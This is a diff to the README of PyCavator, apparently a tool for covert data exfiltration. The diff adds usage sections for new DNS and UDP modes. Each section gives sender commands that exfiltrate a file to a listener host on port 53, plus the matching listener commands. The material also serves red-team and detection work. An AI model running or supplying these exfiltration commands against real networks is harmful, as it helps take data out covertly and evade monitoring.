@@ -11,6 +11,8 @@ With PyCavator, users can easily exfiltrate or receive data using ICMP/HTTPS pac
   * [Usage](#usage)
     + [ICMP](#icmp)
     + [HTTPS](#https)
+	+ [DNS](#dns)
+	+ [UDP](#udp)
   * [How to Contribute](#how-to-contribute)
   * [Disclaimer](#disclaimer)
   * [License](#license)
@@ -108,6 +110,35 @@ Create a self-signed root certificate authority:
 cp cert.pem ca.pem
 ```
 This command copies the contents of the `cert.pem` file to a new file named `ca.pem`. This is often done to create a self-signed root certificate authority (CA), which can be used to sign other certificates for internal use.
+
+### DNS
+<b>Required libraries:</b><br/>
+- dns.query<br/>
+- dns.message<br/>
+- dns.resolver<br/>
+
+<b>Examples</b><br/>:
+Sender mode: exfiltrate data from a file:
+```bash
+  python pycavator-dns.py -f input.txt -s 192.168.1.101 -p 53 -d example.com -i 1 
+```  
+Listener mode: listen for incoming data and save to a single file:
+```bash
+  python pycavator-dns.py -l -s 192.168.1.101 -p 53 -o /tmp
+```  
+>Note: Once file has been sent, use CTRL+C in listener mode to exit and save. 
+
+### UDP
+
+<b>Examples::</b><br/>
+Sender mode: exfiltrate data from a file:
+```bash
+python pycavator-udp.py -f input.txt -s 192.168.1.101 -p 53 -i 1 
+```  
+Listener mode: listen for incoming data and save to a single file:
+```bash
+python pycavator-udp.py -l -s 192.168.1.101 -p 53 -o /tmp
+```
 
 ## How to Contribute
 
